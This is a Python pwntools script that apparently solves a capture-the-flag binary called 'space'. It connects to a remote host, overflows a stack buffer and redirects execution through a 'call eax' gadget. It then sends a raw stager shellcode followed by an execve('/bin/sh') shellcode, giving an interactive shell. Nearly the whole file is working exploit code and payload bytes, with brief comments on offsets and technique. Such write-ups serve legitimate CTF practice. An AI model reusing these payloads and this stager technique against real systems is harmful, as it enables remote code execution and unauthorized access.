from pwn import *

elf = ELF('./space')
#p = elf.process()
p = remote('159.65.21.156',31344)

#Using gdb, I notice that there is 18bytes offset + 13bytes to overwrite return address.
#Since 13bytes is not enough for a execve('/bin/sh') shellcode, I need to figure another way to have more shellcode space.
#I notice that *eax contains the input buffer.
#As such, I can do a call to *eax to use the 18bytes offset for my shellcode.
#Tried a 18bytes shellcode but it didn't work as eax reference to the stack, which means our shellcode is the stack.
#As the 18bytes shellcode does a PUSH which affects the stack, the shellcode got messed up.
#I use a 14bytes stager that reads a 127bytes second stage shellcode from stdin.
#Then a 25bytes execve('/bin/sh') shellcode is used to obtain the shell.

call_eax = b'\x19\x90\x04\x08' #objdump -d space | egrep 'ff d0' 

stager = b'\x6A\x7F\x5A\x54\x59\x31\xDB\x6A\x03\x58\xCD\x80\x51\xC3' #http://shell-storm.org/shellcode/files/shellcode-824.php
payload = [
    stager,
    b'A'*4, #Stager + 4*A = 18bytes offset
    call_eax
]

payload = b''.join(payload)
p.recvuntil("> ")
p.sendline(payload)

log.info("Stager payload sent.")

shellcode = b'\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80' #https://www.exploit-db.com/exploits/47513

p.sendline(shellcode)
log.info("execve('/bin/sh') sent.")
p.interactive()
